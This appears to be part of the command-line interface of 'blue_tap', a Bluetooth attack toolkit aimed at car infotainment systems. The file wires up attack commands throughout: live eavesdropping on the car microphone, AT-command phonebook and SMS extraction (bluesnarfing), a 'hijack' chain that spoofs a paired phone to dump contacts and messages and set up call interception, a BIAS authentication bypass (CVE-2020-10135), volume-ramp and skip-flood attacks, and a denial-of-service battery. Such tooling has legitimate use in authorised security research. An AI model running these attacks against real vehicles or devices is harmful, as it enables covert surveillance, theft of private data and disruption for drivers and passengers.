@click.option("--no-setup", is_flag=True)
def audio_live(mac, no_setup):
    """Live eavesdrop: stream car mic to laptop speakers in real-time."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import live_eavesdrop
    info(f"Starting live eavesdrop on {mac} (streaming car mic to laptop speakers)...")
    if not no_setup:
        info("Auto-configuring HFP profile and mic settings...")
    live_eavesdrop(mac, auto_setup=not no_setup)
    info("Live eavesdrop session ended.")


@audio.command("play")
@click.argument("mac", required=False, default=None)
@click.argument("audio_file")
@click.option("-v", "--volume", default=80, help="Volume in % (1-100)")
def audio_play(mac, audio_file, volume):
    """Play audio file through car speakers via A2DP."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import play_to_car
    info(f"Playing {audio_file} through car speakers on {mac} (volume {volume}%)...")
    play_to_car(mac, audio_file, volume)
    success("Audio playback complete.")
    from blue_tap.utils.session import log_command
    log_command("audio_play", {"audio_file": audio_file, "volume": volume}, category="attack", target=mac)


@audio.command("loopback")
@click.argument("mac", required=False, default=None)
@click.option("-s", "--mic-source", default=None, help="Laptop mic source (auto-detected)")
def audio_loopback(mac, mic_source):
    """Route laptop mic to car speakers in real-time."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import stream_mic_to_car
    src_str = mic_source if mic_source else "auto-detected"
    info(f"Starting loopback: routing laptop mic ({src_str}) to car speakers on {mac}...")
    stream_mic_to_car(mac, mic_source)
    from blue_tap.utils.session import log_command
    log_command("audio_loopback", {"address": mac}, category="attack", target=mac)
    info("Loopback session ended.")


@audio.command("loopback-stop")
def audio_loopback_stop():
    """Stop all audio loopback modules."""
    from blue_tap.attack.a2dp import stop_loopback
    info("Stopping all audio loopback modules...")
    stop_loopback()
    success("Loopback modules stopped.")


@audio.command("capture")
@click.argument("mac", required=False, default=None)
@click.option("-o", "--output", default="a2dp_capture.wav")
@click.option("-d", "--duration", default=60, help="Capture duration in seconds")
def audio_capture_a2dp(mac, output, duration):
    """Capture A2DP media stream to WAV file."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import capture_a2dp
    info(f"Capturing A2DP media stream from {mac} ({duration}s, output: {output})...")
    capture_a2dp(mac, output, duration)
    import os
    if os.path.exists(output):
        size = os.path.getsize(output)
        success(f"A2DP capture saved to {output} ({size} bytes)")
    else:
        warning(f"Capture completed but output file {output} not found.")
    from blue_tap.utils.session import log_command
    log_command("audio_capture_a2dp", {"output": output, "duration": duration}, category="audio", target=mac)


@audio.command("profile")
@click.argument("mac", required=False, default=None)
@click.argument("mode", type=click.Choice(["hfp", "a2dp"]))
def audio_profile(mac, mode):
    """Switch Bluetooth audio profile (hfp=mic, a2dp=media)."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import set_profile_hfp, set_profile_a2dp
    info(f"Switching {mac} to {mode.upper()} profile...")
    if mode == "hfp":
        set_profile_hfp(mac)
    else:
        set_profile_a2dp(mac)
    success(f"Profile switched to {mode.upper()}.")


@audio.command("devices")
def audio_devices():
    """List Bluetooth audio sources and sinks."""
    from blue_tap.attack.a2dp import list_bt_audio_sources, list_bt_audio_sinks

    info("Enumerating Bluetooth audio devices...")
    sources = list_bt_audio_sources()
    sinks = list_bt_audio_sinks()

    if sources:
        table = Table(title="Bluetooth Audio Sources (Microphones)")
        table.add_column("ID")
        table.add_column("Name")
        table.add_column("State")
        for s in sources:
            table.add_row(s["id"], s["name"], s.get("state", ""))
        console.print(table)

    if sinks:
        table = Table(title="Bluetooth Audio Sinks (Speakers)")
        table.add_column("ID")
        table.add_column("Name")
        for s in sinks:
            table.add_row(s["id"], s["name"])
        console.print(table)

    if not sources and not sinks:
        warning("No Bluetooth audio devices found in PulseAudio/PipeWire")


@audio.command("diagnose")
@click.argument("mac", required=False, default=None)
def audio_diagnose(mac):
    """Diagnose Bluetooth audio issues for a device."""
    mac = resolve_address(mac)
    if not mac:
        return
    from blue_tap.attack.a2dp import diagnose_bt_audio
    info(f"Running Bluetooth audio diagnostics for {mac}...")
    diagnose_bt_audio(mac)
    info("Diagnostics complete.")


@audio.command("restart")
def audio_restart():
    """Restart PipeWire/PulseAudio to fix audio routing issues."""
    from blue_tap.attack.a2dp import restart_audio_services
    info("Restarting PipeWire/PulseAudio audio services...")
    restart_audio_services()
    success("Audio services restarted.")


@audio.command("list")
@click.option("-d", "--dir", "directory", default=".", help="Directory to search")
def audio_list(directory):
    """List all captured WAV files with duration and size."""
    from blue_tap.attack.a2dp import list_captures

    info(f"Scanning for WAV files in {directory}...")
    captures = list_captures(directory)
    if not captures:
        warning(f"No WAV files found in {directory}")
        return
    info(f"Found {len(captures)} audio file(s).")

    table = Table(title="Captured Audio Files", show_lines=True)
    table.add_column("#", style="dim", width=4)
    table.add_column("File", style="cyan")
    table.add_column("Duration", style="green", justify="right")
    table.add_column("Size", style="yellow", justify="right")
    table.add_column("Modified", style="magenta")

    for i, cap in enumerate(captures, 1):
        dur = cap["duration_secs"]
        dur_str = f"{int(dur // 60)}:{int(dur % 60):02d}" if dur > 0 else "N/A"
        size_str = f"{cap['size_bytes'] / 1024:.1f} KB"
        table.add_row(str(i), cap["filename"], dur_str, size_str, cap["modified"])
    console.print(table)


@audio.command("playback")
@click.argument("file")
def audio_playback(file):
    """Play a captured audio file on laptop speakers."""
    from blue_tap.attack.a2dp import play_capture

    info(f"Playing captured audio file: {file}")
    if play_capture(file):
        success(f"Playback of {file} complete.")
    else:
        error(f"Playback of {file} failed.")


@audio.command("review")
@click.option("-d", "--dir", "directory", default=".", help="Directory to search")
def audio_review(directory):
    """Interactive audio review: list, select, play, repeat."""
    from blue_tap.attack.a2dp import interactive_review
    info(f"Starting interactive audio review in {directory}...")
    interactive_review(directory)
    info("Interactive review session ended.")


# ============================================================================
# OPP - Object Push
# ============================================================================
@main.group()
def opp():
    """Object Push Profile - push files to IVI."""


@opp.command("push")
@click.argument("address", required=False, default=None)
@click.argument("filepath")
@click.option("-c", "--channel", type=int, default=None)
def opp_push(address, filepath, channel):
    """Push a file to the target device."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.opp import OPPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Object Push")
        if channel is None:
            channel = find_service_channel(address, "OPP")

    if channel is None:
        error("Could not find OPP channel.")
        return

    import os
    file_size = os.path.getsize(filepath) if os.path.exists(filepath) else 0
    info(f"Pushing {filepath} ({file_size} bytes) to {address} via OPP on channel {channel}...")
    client = OPPClient(address, channel=channel)
    if client.connect():
        success(f"OPP connection established with {address}.")
        client.push_file(filepath)
        success(f"File {filepath} sent ({file_size} bytes).")
        client.disconnect()
        info("OPP session closed.")
    else:
        error(f"OPP connection to {address} on channel {channel} failed.")


@opp.command("vcard")
@click.argument("address", required=False, default=None)
@click.option("-n", "--name", required=True, help="Contact name")
@click.option("-p", "--phone", required=True, help="Phone number")
@click.option("-e", "--email", default="", help="Email address")
@click.option("-c", "--channel", type=int, default=None)
def opp_vcard(address, name, phone, email, channel):
    """Push a crafted vCard contact to IVI."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.opp import OPPClient
    from blue_tap.recon.sdp import find_service_channel

    if channel is None:
        channel = find_service_channel(address, "Object Push")

    if channel is None:
        error("Could not find OPP channel.")
        return

    info(f"Pushing vCard for '{name}' ({phone}) to {address} via OPP...")
    client = OPPClient(address, channel=channel)
    if client.connect():
        success(f"OPP connection established with {address}.")
        client.push_vcard(name, phone, email)
        success(f"vCard for '{name}' sent to {address}.")
        client.disconnect()
        info("OPP session closed.")
    else:
        error(f"OPP connection to {address} failed.")


# ============================================================================
# AT / BLUESNARFER - Direct AT Command Extraction
# ============================================================================
@main.group("at")
def at_cmd():
    """AT command data extraction via RFCOMM (bluesnarfer alternative)."""


@at_cmd.command("connect")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=1, help="RFCOMM channel")
def at_connect(address, channel):
    """Interactive AT command session over RFCOMM."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.bluesnarfer import ATClient

    info(f"Opening AT command session to [bold]{address}[/bold] on RFCOMM channel {channel}...")
    client = ATClient(address, channel=channel)
    if not client.connect():
        error("AT connection failed — check channel number or pairing status")
        return

    success("AT session established. Type 'quit' to exit.")
    info("  Try: AT+CGSN (IMEI), AT+CIMI (IMSI), AT+CPBR=1,10 (phonebook)")
    while True:
        try:
            cmd = input("AT> ").strip()
            if cmd.lower() in ("quit", "exit", "q"):
                break
            if cmd:
                result = client.send_at(cmd)
                console.print(result)
        except (EOFError, KeyboardInterrupt):
            break
    client.disconnect()


@at_cmd.command("dump")
@click.argument("address", required=False, default=None)
@click.option("-c", "--channel", type=int, default=1)
@click.option("-o", "--output-dir", default="at_dump")
def at_dump(address, channel, output_dir):
    """Dump all data via AT commands: phonebook, SMS, device info."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.bluesnarfer import ATClient

    info(f"Starting AT data dump from [bold]{address}[/bold] (ch={channel})...")
    info("  Targets: IMEI, IMSI, phonebook (SM/ME), SMS, battery, signal")
    client = ATClient(address, channel=channel)
    if not client.connect():
        error("AT connection failed")
        return
    try:
        info("  Extracting data via AT commands...")
        results = client.dump_all(output_dir)
        if results:
            success(f"AT dump complete -> {output_dir}/")
            from blue_tap.utils.session import log_command
            log_command("at_dump", results, category="data", target=address)
        else:
            warning("No data extracted via AT commands")
    finally:
        client.disconnect()
        info("  AT session closed")


@at_cmd.command("snarf")
@click.argument("address", required=False, default=None)
@click.option("-m", "--memory", default="ME",
              type=click.Choice(["SM", "ME", "DC", "RC", "MC", "FD", "ON"]))
@click.option("-r", "--range", "entry_range", default="1-100")
def at_snarf(address, memory, entry_range):
    """Use bluesnarfer binary for phonebook extraction."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.bluesnarfer import bluesnarfer_extract
    info(f"Running bluesnarfer against [bold]{address}[/bold] (memory={memory}, range={entry_range})...")
    parts = entry_range.split("-")
    if len(parts) != 2:
        error("Range must be START-END (e.g., 1-100)")
        return
    try:
        start, end = int(parts[0]), int(parts[1])
    except ValueError:
        error("Range values must be integers")
        return
    bluesnarfer_extract(address, memory, start, end)


# ============================================================================
# VULNSCAN - Vulnerability Scanner
# ============================================================================
@main.command("vulnscan")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output", default=None, help="Output file (JSON)")
@click.option("--phone", default=None, help="Paired phone MAC for the BIAS auto-reconnect probe")
def vulnscan(address, hci, output, phone):
    """Scan target for vulnerabilities and attack-surface indicators.

    \b
    Evidence-based checks: SSP/legacy pairing, service exposure (active
    RFCOMM probe), KNOB, BLURtooth, BIAS, BlueBorne, pairing method,
    writable GATT characteristics, and modular CVE differential probes.
    Findings are classified as confirmed, inconclusive, pairing_required,
    not_applicable, or legacy heuristic statuses where applicable.

    \b
    This command runs the full vulnscan pass, including active checks such as
    PIN lockout, raw ACL BlueFrag, and the BIAS auto-reconnect probe.
    Provide --phone if you want the BIAS probe to test reconnect behavior
    against the target's normally paired phone identity.
    """
    address = resolve_address(address)
    if not address:
        return

    phone_address = None
    if phone:
        phone_address = resolve_address(phone, prompt="Verify phone address")

    from blue_tap.attack.vuln_scanner import run_vulnerability_scan
    from blue_tap.attack.cve_framework import summarize_findings
    info(f"Starting vulnerability assessment on [bold]{address}[/bold]...")
    info("  Running 20+ checks: SSP, KNOB, BIAS, BlueBorne, BLURtooth, BLUFFS, PerfektBlue, BrakTooth...")
    result = run_vulnerability_scan(address, hci, active=True, phone_address=phone_address)
    findings = result["findings"]
    summary = summarize_findings(findings)
    critical = sum(1 for f in findings if f.get("severity", "").upper() == "CRITICAL")
    high = sum(1 for f in findings if f.get("severity", "").upper() == "HIGH")
    success(
        f"Assessment complete: {summary['displayed']} finding(s) — "
        f"{summary['confirmed']} confirmed, {summary['inconclusive']} inconclusive, "
        f"{summary['pairing_required']} pairing-required "
        f"({critical} CRITICAL, {high} HIGH)"
    )

    # Recommended next steps based on findings
    if findings:
        shown = set()
        recommendations = []
        for f in findings:
            name = f.get("name", "").lower()
            if "knob" in name and "knob" not in shown:
                recommendations.append(f"  KNOB: blue-tap knob probe {address} -i {hci}")
                shown.add("knob")
            elif "bias" in name and "bias" not in shown:
                _phone = phone or "PHONE_MAC"
                recommendations.append(f"  BIAS: blue-tap bias probe {address} {_phone} -i {hci}")
                shown.add("bias")
            elif "bluffs" in name and "bluffs" not in shown:
                recommendations.append(f"  BLUFFS: blue-tap bluffs {address} --variant probe -i {hci}")
                shown.add("bluffs")
            elif ("blurtooth" in name or "ctkd" in name) and "blurtooth" not in shown:
                recommendations.append(f"  BLURtooth: blue-tap vulnscan {address} -i {hci}")
                shown.add("blurtooth")
            elif "service" in name and "expos" in name and "service" not in shown:
                _phone = phone or "PHONE_MAC"
                recommendations.append(f"  Data extraction: blue-tap hijack {address} {_phone} -i {hci}")
                shown.add("service")
        if recommendations:
            info("")
            info("Recommended next steps:")
            for rec in recommendations:
                info(rec)

    from blue_tap.utils.session import log_command
    log_command("vulnscan", result, category="vuln", target=address)

    if output:
        _save_json(result, output)


# ============================================================================
# HIJACK - Full Attack Chain
# ============================================================================
@main.command()
@click.argument("ivi_address", required=False, default=None)
@click.argument("phone_address", required=False, default=None)
@click.option("-n", "--phone-name", default="", help="Phone name to impersonate")
@click.option("-i", "--hci", default="hci0")
@click.option("-o", "--output-dir", default="hijack_output")
@click.option("--recon-only", is_flag=True, help="Only run reconnaissance phase")
@click.option("--skip-audio", is_flag=True, help="Skip audio setup phase")
@click.option("--bias", is_flag=True, help="Use BIAS attack (CVE-2020-10135) for auth bypass")
def hijack(ivi_address, phone_address, phone_name, hci, output_dir,
           recon_only, skip_audio, bias):
    """Full IVI hijack: spoof phone identity and extract data.

    \b
    IVI_ADDRESS:   Target IVI Bluetooth address
    PHONE_ADDRESS: Phone MAC to impersonate

    \b
    Attack phases:
      1. Recon      - Fingerprint IVI, discover services
      2. Impersonate - Spoof MAC + name + device class
      3. Connect     - Connect to IVI as spoofed phone
      4a. PBAP      - Download phonebook & call logs
      4b. MAP       - Download SMS/MMS messages
      5. Audio      - Setup HFP for call interception

    \b
    Use --bias to attempt BIAS (CVE-2020-10135) role-switch attack
    instead of normal pairing. Useful when the IVI validates link keys
    and rejects simple MAC spoofing.
    """
    if not ivi_address or not phone_address:
        result = pick_two_devices()
        if not result:
            error("Device selection cancelled")
            return
        ivi_address, phone_address = result
    from blue_tap.attack.hijack import HijackSession

    info(f"Starting IVI hijack: target={ivi_address}, impersonating={phone_address}")
    if phone_name:
        info(f"  Phone name: {phone_name}")
    info(f"  Adapter: {hci}, Output: {output_dir}")
    if bias:
        info("  Mode: BIAS authentication bypass (CVE-2020-10135)")
    elif recon_only:
        info("  Mode: Reconnaissance only")
    else:
        info("  Mode: Full attack chain")

    verbose(f"Starting hijack session: IVI={ivi_address} Phone={phone_address}")
    session = HijackSession(
        ivi_address=ivi_address,
        phone_address=phone_address,
        phone_name=phone_name,
        hci=hci,
        output_dir=output_dir,
    )

    try:
        if recon_only:
            info("Phase 1/1: Reconnaissance — fingerprinting IVI and discovering services...")
            session.recon()
            success("Reconnaissance complete")
        elif bias:
            # BIAS path: recon → BIAS auth bypass → dump data
            info("Phase 1/4: Reconnaissance — fingerprinting IVI...")
            session.recon()
            success("Recon complete")
            info("Phase 2/4: BIAS authentication bypass...")
            if session.connect_bias():
                success("BIAS connection established")
                info("Phase 3/4: Dumping phonebook via PBAP...")
                session.dump_phonebook()
                info("Phase 3/4: Dumping messages via MAP...")
                session.dump_messages()
                if not skip_audio:
                    info("Phase 4/4: Setting up HFP audio interception...")
                    session.setup_audio()
                else:
                    info("Phase 4/4: Audio setup skipped (--skip-audio)")
            else:
                warning("BIAS connection failed — target may not be vulnerable")
            results = {"method": "bias", "phases": {"recon": "success"}}
            os.makedirs(output_dir, exist_ok=True)
            _save_json(results, os.path.join(output_dir, "attack_results.json"))
            success(f"BIAS attack results saved to {output_dir}/attack_results.json")
            from blue_tap.utils.session import log_command
            log_command("hijack", results, category="attack", target=ivi_address)
        else:
            info("Running full attack chain (recon → impersonate → connect → dump → audio)...")
            results = session.run_full_attack()
            # Save results
            os.makedirs(output_dir, exist_ok=True)
            results_file = os.path.join(output_dir, "attack_results.json")
            _save_json(results, results_file)
            success(f"Full attack complete — results saved to {results_file}")
            from blue_tap.utils.session import log_command
            log_command("hijack", results, category="attack", target=ivi_address)
    except KeyboardInterrupt:
        warning("\nInterrupted by user")
    finally:
        try:
            info("Cleaning up hijack session...")
            session.cleanup()
            info("Session closed")
        except Exception as e:
            error(f"Cleanup error: {e}")


# ============================================================================
# BIAS - Bluetooth Impersonation AttackS (CVE-2020-10135)
# ============================================================================
@main.group()
def bias():
    """BIAS attack — bypass authentication via role-switch (CVE-2020-10135)."""


@bias.command("probe")
@click.argument("ivi_address", required=False, default=None)
@click.argument("phone_address", required=False, default=None)
@click.option("-n", "--phone-name", default="", help="Phone name")
@click.option("-i", "--hci", default="hci0")
def bias_probe(ivi_address, phone_address, phone_name, hci):
    """Probe whether IVI is potentially vulnerable to BIAS.

    \b
    Checks SSP support, BT version, and auto-reconnect behavior.
    Does not attempt the actual attack.
    """
    if not ivi_address or not phone_address:
        result = pick_two_devices()
        if not result:
            error("Device selection cancelled")
            return
        ivi_address, phone_address = result
    from blue_tap.attack.bias import BIASAttack

    info(f"Probing BIAS vulnerability on {ivi_address}")
    info(f"  Impersonating: {phone_address}, Adapter: {hci}")
    info("Checking SSP support, BT version, and auto-reconnect behavior...")
    attack = BIASAttack(ivi_address, phone_address, phone_name, hci)
    try:
        attack.probe_vulnerability()
        success("BIAS probe complete")
        from blue_tap.utils.session import log_command
        log_command("bias_probe", {"ivi_address": ivi_address, "phone_address": phone_address}, category="attack", target=ivi_address)
    except Exception as exc:
        error(f"BIAS probe failed: {exc}")


@bias.command("attack")
@click.argument("ivi_address", required=False, default=None)
@click.argument("phone_address", required=False, default=None)
@click.option("-n", "--phone-name", default="", help="Phone name to impersonate")
@click.option("-i", "--hci", default="hci0")
@click.option("-m", "--method", default="auto",
              type=click.Choice(["auto", "role_switch", "darkfirmware"]),
              help="Attack method")
def bias_attack(ivi_address, phone_address, phone_name, hci, method):
    """Execute BIAS attack to bypass IVI authentication.

    \b
    Methods:
      auto         - Try role-switch, then use DarkFirmware LMP injection
      role_switch  - Software-only SSP downgrade (no special hardware)
      darkfirmware - Full LMP injection via DarkFirmware RTL8761B

    \b
    Requires: target IVI address and phone address to impersonate.
    The phone should be a device the IVI has previously paired with.
    """
    if not ivi_address or not phone_address:
        result = pick_two_devices()
        if not result:
            error("Device selection cancelled")
            return
        ivi_address, phone_address = result
    from blue_tap.attack.bias import BIASAttack

    info(f"Executing BIAS attack against {ivi_address} via {phone_address}")
    info(f"  Method: {method}, Adapter: {hci}")
    if phone_name:
        info(f"  Phone name: {phone_name}")
    attack = BIASAttack(ivi_address, phone_address, phone_name, hci)
    try:
        attack.execute(method)
        success("BIAS attack execution complete")
        from blue_tap.utils.session import log_command
        log_command("bias_attack", {"ivi_address": ivi_address, "phone_address": phone_address, "method": method}, category="attack", target=ivi_address)
    except Exception as exc:
        error(f"BIAS attack failed: {exc}")


# ============================================================================
# AVRCP - Media Control
# ============================================================================
@main.group()
def avrcp():
    """AVRCP media control and attacks."""


@avrcp.command("play")
@click.argument("address", required=False, default=None)
def avrcp_play(address):
    """Send play command."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Sending PLAY command to {address}...")
        ctrl.play()
        success("PLAY command sent.")
        from blue_tap.utils.session import log_command
        log_command("avrcp_play", {"address": address, "action": "play"}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("pause")
@click.argument("address", required=False, default=None)
def avrcp_pause(address):
    """Send pause command."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Sending PAUSE command to {address}...")
        ctrl.pause()
        success("PAUSE command sent.")
        from blue_tap.utils.session import log_command
        log_command("avrcp_pause", {"address": address, "action": "pause"}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("stop")
@click.argument("address", required=False, default=None)
def avrcp_stop(address):
    """Send stop command."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Sending STOP command to {address}...")
        ctrl.stop()
        success("STOP command sent.")
        from blue_tap.utils.session import log_command
        log_command("avrcp_stop", {"address": address, "action": "stop"}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("next")
@click.argument("address", required=False, default=None)
def avrcp_next(address):
    """Skip to next track."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Sending NEXT TRACK command to {address}...")
        ctrl.next_track()
        success("NEXT TRACK command sent.")
        from blue_tap.utils.session import log_command
        log_command("avrcp_next", {"address": address, "action": "next"}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("prev")
@click.argument("address", required=False, default=None)
def avrcp_prev(address):
    """Skip to previous track."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Sending PREVIOUS TRACK command to {address}...")
        ctrl.previous_track()
        success("PREVIOUS TRACK command sent.")
        from blue_tap.utils.session import log_command
        log_command("avrcp_prev", {"address": address, "action": "prev"}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("volume")
@click.argument("address", required=False, default=None)
@click.argument("level", type=int)
def avrcp_volume(address, level):
    """Set volume (0-127)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Setting volume to {level} on {address}...")
        ctrl.set_volume(level)
        success(f"Volume set to {level}.")
        from blue_tap.utils.session import log_command
        log_command("avrcp_volume", {"address": address, "action": "set_volume", "level": level}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("volume-ramp")
@click.argument("address", required=False, default=None)
@click.option("--start", default=0, help="Start volume")
@click.option("--end", default=127, help="End volume")
@click.option("--step-ms", default=100, help="Delay between steps (ms)")
def avrcp_volume_ramp(address, start, end, step_ms):
    """Gradually ramp volume (escalation attack)."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Ramping volume from {start} to {end} (step {step_ms}ms) on {address}...")
        ctrl.volume_ramp(start=start, target=end, step_ms=step_ms)
        success(f"Volume ramp complete ({start} -> {end}).")
        from blue_tap.utils.session import log_command
        log_command("avrcp_volume_ramp", {"address": address, "action": "volume_ramp", "start": start, "end": end, "step_ms": step_ms}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("skip-flood")
@click.argument("address", required=False, default=None)
@click.option("--count", default=100, help="Number of skip commands")
@click.option("--interval", default=0.1, help="Interval between skips (seconds)")
def avrcp_skip_flood(address, count, interval):
    """Rapid track skip injection."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Starting skip flood: {count} skips at {interval}s interval on {address}...")
        ctrl.skip_flood(count, int(interval * 1000))
        success(f"Skip flood complete ({count} skips sent).")
        from blue_tap.utils.session import log_command
        log_command("avrcp_skip_flood", {"address": address, "action": "skip_flood", "count": count, "interval": interval}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("metadata")
@click.argument("address", required=False, default=None)
def avrcp_metadata(address):
    """Show current track metadata."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Fetching track metadata from {address}...")
        track = ctrl.get_track_info()
        status = ctrl.get_status()
        console.print(f"[bold cyan]Status:[/bold cyan] {status}")
        if track:
            success("Track metadata retrieved.")
            for key, val in track.items():
                console.print(f"  [cyan]{key}:[/cyan] {val}")
        else:
            warning("No track info available")
        from blue_tap.utils.session import log_command
        log_command("avrcp_metadata", {"address": address, "action": "metadata", "track": track, "status": status}, category="attack", target=address)
    finally:
        ctrl.disconnect()


@avrcp.command("monitor")
@click.argument("address", required=False, default=None)
@click.option("-d", "--duration", default=300, help="Monitor duration (seconds)")
def avrcp_monitor(address, duration):
    """Monitor track changes in real-time."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.avrcp import AVRCPController
    info(f"Connecting AVRCP to {address}...")
    ctrl = AVRCPController(address)
    if not ctrl.connect():
        error(f"AVRCP connection to {address} failed.")
        return
    try:
        info(f"Monitoring track changes on {address} for {duration}s (Ctrl+C to stop)...")

        def on_change(changed):
            if isinstance(changed, dict):
                # May receive full props dict or just track dict
                if "Track" in changed:
                    track = changed["Track"]
                    console.print(f"[green]Track changed:[/green] "
                                  f"{track.get('Artist', '?')} - {track.get('Title', '?')}")
                elif "Title" in changed or "Artist" in changed:
                    console.print(f"[green]Track changed:[/green] "
                                  f"{changed.get('Artist', '?')} - {changed.get('Title', '?')}")
                if "Status" in changed:
                    console.print(f"[yellow]Status:[/yellow] {changed['Status']}")

        ctrl.monitor_metadata(duration, callback=on_change)
        info("Metadata monitoring ended.")
        from blue_tap.utils.session import log_command
        log_command("avrcp_monitor", {"address": address, "action": "monitor", "duration": duration}, category="attack", target=address)
    finally:
        ctrl.disconnect()


# ============================================================================
# DOS - Denial of Service & Pairing Attacks
# ============================================================================
@main.group()
def dos():
    """DoS attacks and pairing abuse."""


def _parse_key_value_overrides(pairs: tuple[str, ...]) -> dict[str, str | int | float | bool]:
    """Parse repeated key=value CLI options into a typed dict."""
    parsed: dict[str, str | int | float | bool] = {}
    for pair in pairs:
        if "=" not in pair:
            raise click.BadParameter(f"Invalid override '{pair}'. Expected key=value.")
        key, raw_value = pair.split("=", 1)
        key = key.strip()
        value = raw_value.strip()
        if not key:
            raise click.BadParameter(f"Invalid override '{pair}'. Missing key.")
        lowered = value.lower()
        if lowered in {"true", "false"}:
            parsed[key] = lowered == "true"
            continue
        try:
            if "." in value:
                parsed[key] = float(value)
            else:
                parsed[key] = int(value)
            continue
        except ValueError:
            parsed[key] = value
    return parsed


@dos.command("list")
def dos_list():
    """List modular DoS checks available to the DoS runner."""
    from blue_tap.attack.dos_runner import list_dos_checks

    checks = list_dos_checks()
    table = Table(title="DoS Check Registry")
    table.add_column("Check ID", style="bold cyan")
    table.add_column("CVE", style="yellow")
    table.add_column("Protocol", style="magenta")
    table.add_column("DarkFirmware", style="yellow")
    table.add_column("Pairing", style="yellow")
    table.add_column("Recovery Probes", style="green")
    table.add_column("Default Params", style="dim")
    table.add_column("Description", style="white")

    for check in checks:
        table.add_row(
            check["check_id"],
            ",".join(check.get("cves", [])),
            check["protocol"],
            "yes" if check["requires_darkfirmware"] else "no",
            "yes" if check.get("requires_pairing") else "no",
            ",".join(check.get("recovery_probes", [])),
            json.dumps(check["default_params"], sort_keys=True),
            check["description"],
        )
    console.print(table)


@dos.command("run")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("--checks", default="", help="Comma-separated check ids to run (default: all)")
@click.option("--recovery-timeout", default=180, type=int, help="Seconds to wait for target recovery after an unresponsive result")
def dos_run(address, hci, checks, recovery_timeout):
    """Run the modular DoS battery sequentially with recovery monitoring."""
    address = resolve_address(address)
    if not address:
        return
    from blue_tap.attack.dos_runner import run_dos_checks
    from blue_tap.attack.dos_framework import summarize_dos_checks
    from blue_tap.utils.session import log_command

    selected = [item.strip() for item in checks.split(",") if item.strip()] or None
    info(f"Running DoS battery against [bold]{address}[/bold] via {hci}")
    result = run_dos_checks(address, hci=hci, check_ids=selected, recovery_timeout=recovery_timeout)
    summary = summarize_dos_checks(result.get("checks", []))
    success(
        f"DoS battery complete: {summary['total']} check(s), "
        f"{summary['success']} success, {summary['recovered']} recovered, "
        f"{summary['unresponsive']} unresponsive, {summary['error']} error"
    )
    log_command("dos_run", result, category="dos", target=address)


@dos.command("check")
@click.argument("check_id")
@click.argument("address", required=False, default=None)
@click.option("-i", "--hci", default="hci0", help="HCI adapter")
@click.option("--set", "overrides", multiple=True, help="Override a default param with key=value (repeatable)")
@click.option("--recovery-timeout", default=180, type=int, help="Seconds to wait for target recovery after an unresponsive result")
def dos_check(check_id, address, hci, overrides, recovery_timeout):
    """Run a single modular DoS check with optional parameter overrides."""
